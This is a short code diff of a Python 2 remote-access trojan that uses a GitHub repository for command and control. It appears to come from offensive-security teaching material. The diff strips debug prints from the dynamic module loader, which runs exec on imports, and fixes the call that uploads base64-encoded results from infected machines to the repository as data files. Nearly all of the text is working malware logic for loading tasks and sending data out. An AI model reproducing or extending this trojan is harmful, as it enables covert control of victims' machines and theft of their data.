@@ -66,8 +66,6 @@ def get_trojan_config():
 
 	for task in config:
 		if task['module'] not in sys.modules:
-			print "not in sys.modules"
-			print "import %s" % task['module']
 			exec("import %s" % task['module'])
 
 	return config
@@ -75,7 +73,7 @@ def get_trojan_config():
 def store_module_result(data):
 	gh,repo,data = connect_to_github()
 	remote_path = "data/%s/%d.data" % (trojan_id,random.randint(1000,10000))
-	repo.createfile(remote_path,"Commit message",base64.b64encode(data))
+	repo.create_file(remote_path,"Commit message",base64.b64encode(str(data)))
 
 	return
 
@@ -102,11 +100,4 @@ while True:
 		time.sleep(random.randint(1,10))
 
 	time.sleep(random.randint(1000,10000))
-
-
-
-
-
-
-
 
